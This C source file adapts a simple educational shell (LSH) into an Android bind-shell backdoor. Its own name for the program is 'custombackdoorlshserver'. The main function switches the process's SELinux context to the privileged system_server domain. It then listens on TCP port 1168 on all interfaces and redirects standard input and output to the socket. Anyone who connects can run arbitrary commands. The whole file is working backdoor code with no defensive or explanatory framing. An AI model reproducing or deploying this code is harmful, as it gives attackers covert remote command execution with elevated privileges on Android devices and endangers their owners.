/***************************************************************************//**

  @file         main.c

  @author       Stephen Brennan

  @date         Thursday,  8 January 2015

  @brief        LSH (Libstephen SHell)

*******************************************************************************/

#include <sys/wait.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#include <stdlib.h>
#include <dirent.h>

#include "selinux.h"

#include <android/log.h>

#define APP_NAME "custombackdoorlshserver"
#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, APP_NAME, __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }

/*
  Function Declarations for builtin shell commands:
 */
int lsh_cd(char **args);
int lsh_help(char **args);
int lsh_exit(char **args);

/*
  List of builtin commands, followed by their corresponding functions.
 */
char *builtin_str[] = {
  "cd",
  "help",
  "exit"
};

int (*builtin_func[]) (char **) = {
  &lsh_cd,
  &lsh_help,
  &lsh_exit
};

int lsh_num_builtins() {
  return sizeof(builtin_str) / sizeof(char *);
}

/*
  Builtin function implementations.
*/

/**
   @brief Bultin command: change directory.
   @param args List of args.  args[0] is "cd".  args[1] is the directory.
   @return Always returns 1, to continue executing.
 */
int lsh_cd(char **args)
{
  if (args[1] == NULL) {
    fprintf(stderr, "lsh: expected argument to \"cd\"\n");
  } else {
    if (chdir(args[1]) != 0) {
      perror("lsh");
    }
  }
  return 1;
}

/**
   @brief Builtin command: print help.
   @param args List of args.  Not examined.
   @return Always returns 1, to continue executing.
 */
int lsh_help(char **args)
{
  int i;
  printf("Stephen Brennan's LSH\n");
  printf("Type program names and arguments, and hit enter.\n");
  printf("The following are built in:\n");

  for (i = 0; i < lsh_num_builtins(); i++) {
    printf("  %s\n", builtin_str[i]);
  }

  printf("Use the man command for information on other programs.\n");
  return 1;
}

/**
   @brief Builtin command: exit.
   @param args List of args.  Not examined.
   @return Always returns 0, to terminate execution.
 */
int lsh_exit(char **args)
{
  return 0;
}

/**
  @brief Launch a program and wait for it to terminate.
  @param args Null terminated list of arguments (including program).
  @return Always returns 1, to continue execution.
 */
int lsh_launch(char **args)
{
  pid_t pid;
  int status;

  pid = fork();
  if (pid == 0) {
    // Child process
    if (execvp(args[0], args) == -1) {
      perror("lsh");
    }
    exit(EXIT_FAILURE);
  } else if (pid < 0) {
    // Error forking
    perror("lsh");
  } else {
    // Parent process
    do {
      waitpid(pid, &status, WUNTRACED);
    } while (!WIFEXITED(status) && !WIFSIGNALED(status));
  }

  return 1;
}

/**
   @brief Execute shell built-in or launch program.
   @param args Null terminated list of arguments.
   @return 1 if the shell should continue running, 0 if it should terminate
 */
int lsh_execute(char **args)
{
  int i;

  if (args[0] == NULL) {
    // An empty command was entered.
    return 1;
  }

  for (i = 0; i < lsh_num_builtins(); i++) {
    if (strcmp(args[0], builtin_str[i]) == 0) {
      return (*builtin_func[i])(args);
    }
  }

  return lsh_launch(args);
}

#define LSH_RL_BUFSIZE 1024
/**
   @brief Read a line of input from stdin.
   @return The line from stdin.
 */
char *lsh_read_line(void)
{
  int bufsize = LSH_RL_BUFSIZE;
  int position = 0;
  char *buffer = malloc(sizeof(char) * bufsize);
  int c;

  if (!buffer) {
    fprintf(stderr, "lsh: allocation error\n");
    exit(EXIT_FAILURE);
  }

  while (1) {
    // Read a character
    c = getchar();

    // If we hit EOF, replace it with a null character and return.
    if (c == EOF || c == '\n') {
      buffer[position] = '\0';
      return buffer;
    } else {
      buffer[position] = c;
    }
    position++;

    // If we have exceeded the buffer, reallocate.
    if (position >= bufsize) {
      bufsize += LSH_RL_BUFSIZE;
      buffer = realloc(buffer, bufsize);
      if (!buffer) {
        fprintf(stderr, "lsh: allocation error\n");
        exit(EXIT_FAILURE);
      }
    }
  }
}

#define LSH_TOK_BUFSIZE 64
#define LSH_TOK_DELIM " \t\r\n\a"
/**
   @brief Split a line into tokens (very naively).
   @param line The line.
   @return Null-terminated array of tokens.
 */
char **lsh_split_line(char *line)
{
  int bufsize = LSH_TOK_BUFSIZE, position = 0;
  char **tokens = malloc(bufsize * sizeof(char*));
  char *token, **tokens_backup;

  if (!tokens) {
    fprintf(stderr, "lsh: allocation error\n");
    exit(EXIT_FAILURE);
  }

  token = strtok(line, LSH_TOK_DELIM);
  while (token != NULL) {
    tokens[position] = token;
    position++;

    if (position >= bufsize) {
      bufsize += LSH_TOK_BUFSIZE;
      tokens_backup = tokens;
      tokens = realloc(tokens, bufsize * sizeof(char*));
      if (!tokens) {
		free(tokens_backup);
        fprintf(stderr, "lsh: allocation error\n");
        exit(EXIT_FAILURE);
      }
    }

    token = strtok(NULL, LSH_TOK_DELIM);
  }
  tokens[position] = NULL;
  return tokens;
}

/**
   @brief Loop getting input and executing it.
 */
void lsh_loop(void)
{
  char *line;
  char **args;
  int status;

  do {
    printf("> ");
    flush();
    line = lsh_read_line();
    args = lsh_split_line(line);
    status = lsh_execute(args);

    free(line);
    free(args);
  } while (status);
}

int flush() {
  fflush(stdout);
  fflush(stderr);
  return 1;
}

/**
   @brief Main entry point.
   @param argc Argument count.
   @param argv Argument vector.
   @return status code
 */
int main(int argc, char **argv)
{
  LOGV("From uid%i gid:%i\n",getuid(),getgid());
  LOGV("From euid%i egid:%i\n",geteuid(),getegid());
  int rc = 0;
  rc = is_selinux_enabled();
  if (rc != 0 && rc != -1) {
	char * curcon = 0;
	char * cuscon = 0;
    LOGV("Selinux:yes\n");
	rc=0;
	rc = getcon(&curcon);
	if (rc) {
	    LOGV("Could not get current SELinux context (getcon() failed)\n");
	    return -1;
	};
	LOGV("Currently in SELinux context \"%s\"\n", (char *) curcon);
	cuscon = "u:r:system_server:s0";
	rc=0;
	rc = setcon(cuscon);
	if (rc) {
		LOGV("Could not set current SELinux context (setcon() failed)\n");
		return -1;
	};

	rc=0;
	rc = getcon(&curcon);
	if (rc) {
		LOGV("Could not get current SELinux context (getcon() failed)\n");
		return -1;
	};
	LOGV("Currently in SELinux context \"%s\"\n", (char *) curcon);
  } else if (rc == -1) {
    LOGV("Could not check SELinux state (is_selinux_enabled() failed)\n");
    return -1;
  } else {
	LOGV("SELinux is not enabled.\n");
  };
  
  argc -= 1;
  int i342 = 0;
  LOGV("Started\n");
  while (i342<=argc) {
    LOGV("arg%i: %s\n",i342,argv[i342]);
    i342++;
  }
  int sockfd, resultfd, i;
  struct sockaddr_in srv_addr;
  sockfd = socket( AF_INET, SOCK_STREAM, IPPROTO_IP );
  if (sockfd==-1) {
    LOGV("Could not create socket,Error:%s\n",strerror(errno));
    return -1;
  }
  //srv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
  srv_addr.sin_addr.s_addr = INADDR_ANY;
  srv_addr.sin_family = AF_INET;
  srv_addr.sin_port = htons( 1168 );
  if(bind(sockfd, (struct sockaddr *) &srv_addr, sizeof(srv_addr))==-1) {
    LOGV("Could not bind to the socket,Error:%s\n",strerror(errno));
    return -1;
  }
  if(listen(sockfd, 0)==-1) {
    LOGV("Could not listen to the socket,Error:%s\n",strerror(errno));
    return -1;
  }
  resultfd = accept(sockfd, NULL, NULL);
  /*cnct = connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr));
  if (cnct==-1) {
    printf("Could not connect socket,Error:%s\n",strerror(errno));
    return -1;
  }*/

  for(i = 0; i <= 2; i++)
    dup2(resultfd, i);

  LOGV("ciao\n");
  flush();
  // Load config files, if any.

  // Run command loop.
  lsh_loop();

  // Perform any shutdown/cleanup.
  //int true;
  //true = 1;
  //setsockopt(resultfd,SOL_SOCKET,SO_REUSEADDR,&true,sizeof(int));
  //setsockopt(sockfd,SOL_SOCKET,SO_REUSEADDR,&true,sizeof(int));
  close(resultfd);
  close(sockfd);
  return EXIT_SUCCESS;
}

